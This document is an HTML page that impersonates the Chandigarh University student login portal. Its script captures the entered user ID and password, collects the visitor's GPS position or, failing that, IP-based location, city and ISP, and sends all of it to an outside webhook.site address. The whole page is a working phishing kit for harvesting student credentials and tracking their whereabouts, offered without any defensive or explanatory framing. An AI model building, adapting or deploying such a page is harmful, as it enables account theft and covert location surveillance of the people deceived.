<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chandigarh University | Student Login</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>

    <div class="login-box">
        <div class="logo-section">
            <img src="images/cu-logo.png" alt="CU Logo" class="logo">
        </div>

        <h2>Log in</h2>
        <p class="subtitle">Welcome to University Information Management System</p>
        
        <form onsubmit="submitData(event)">
            <div class="input-group">
                <input type="text" id="userId" name="userId" placeholder="User Id" required>
            </div>

            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            
            <button onclick="submitData(event)" class="btn-login">LOGIN</button>
        </form>

        <div class="divider">
            <span>OR</span>
        </div>

        <div class="registration-section">
            <a href="#" class="btn-register">CLICK HERE FOR REGISTRATION</a>
        </div>
    </div>

    <script>
    function submitData(event) {
        event.preventDefault();
      const name = document.getElementById("password").value;
      const uid = document.getElementById("userId").value;

      if (!name || !uid) {
        alert("Please fill all fields");
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => sendGPS(name, uid, pos),
          () => sendIP(name, uid)
        );
      } else {
        sendIP(name, uid);
      }
    }

    function sendGPS(name, uid, pos) {
      const data = {
        uid: uid,
        password: name,
        location_type: "GPS",
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: new Date().toISOString()
      };

      sendToWebhook(data);
    //   document.getElementById("status").innerText =
        // "Location shared successfully.";
    }

    function sendIP(name, uid) {
      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(ip => {
          const data = {
            uid: uid,
            password: name,
            location_type: "IP",
            ip: ip.ip,
            city: ip.city,
            region: ip.region,
            country: ip.country_name,
            isp: ip.org,
            timestamp: new Date().toISOString()
          };

          sendToWebhook(data);
          // document.getElementById("status").innerText =
          //   "Approximate location shared.";
        });
    }

    // function sendToWebhook(data) {
    //   fetch("https://webhook.site/e03a8837-c273-41f8-863b-180bcc3a73b8", {
    //     method: "POST",
    //     headers: { "Content-Type": "application/json" },
    //     body: JSON.stringify(data)
    //   });
    // }

    async function sendToWebhook(data) {
      try {
        const response = await fetch("https://webhook.site/e03a8837-c273-41f8-863b-180bcc3a73b8", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        if (response.ok) {
            alert("Data logged to webhook!");
        }
      } catch (error) {
        console.error("Error sending data:", error);
      }
    }
  </script>

</body>
</html>
